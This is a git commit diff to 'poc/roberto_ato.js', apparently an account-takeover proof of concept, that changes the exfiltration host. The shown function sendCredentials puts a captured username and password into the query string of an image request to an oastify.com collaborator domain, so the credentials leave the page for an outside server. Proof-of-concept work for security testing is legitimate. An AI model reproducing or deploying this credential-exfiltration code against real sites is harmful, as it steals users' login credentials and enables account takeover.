62136786769de0bf84b77dff7955f123aec8df15
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2024-07-25 20:15:30 +0900

    Update roberto_ato.js

--- poc/roberto_ato.js
+++ poc/roberto_ato.js
@@ -48,7 +48,7 @@ setTimeout(function () {
 
   function sendCredentials(username, password) {
     var img = new Image();
-    img.src = `http://stp9ynul0oejy435dsvxk2qz8qeh27qw.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+    img.src = `http://ybd58ovsn2m1dp1oevvh82tbq2wtkj88.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
   }
 
   function f() {
